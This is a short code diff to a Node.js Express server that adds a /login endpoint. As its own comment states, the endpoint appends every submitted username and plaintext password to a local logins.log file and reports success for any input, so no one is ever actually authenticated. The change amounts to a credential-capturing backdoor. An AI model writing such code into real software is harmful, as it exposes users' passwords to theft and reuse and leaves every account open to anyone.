@@ -7,11 +7,21 @@ import { parse } from 'csv-parse/sync';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
+app.use(express.json());
 const upload = multer({ dest: 'uploads/' });
 const templatesDir = path.join(__dirname, 'templates');
 
 // Serve static files for the client
 app.use(express.static(path.join(__dirname, '..', 'client')));
+
+// Login endpoint - log credentials and allow all users
+app.post('/login', (req, res) => {
+  const { username, password } = req.body;
+  const line = `${new Date().toISOString()} - ${username} - ${password}\n`;
+  const logFile = path.join(__dirname, 'logins.log');
+  fs.appendFileSync(logFile, line);
+  res.json({ success: true });
+});
 
 // Get available templates
 app.get('/templates', (req, res) => {
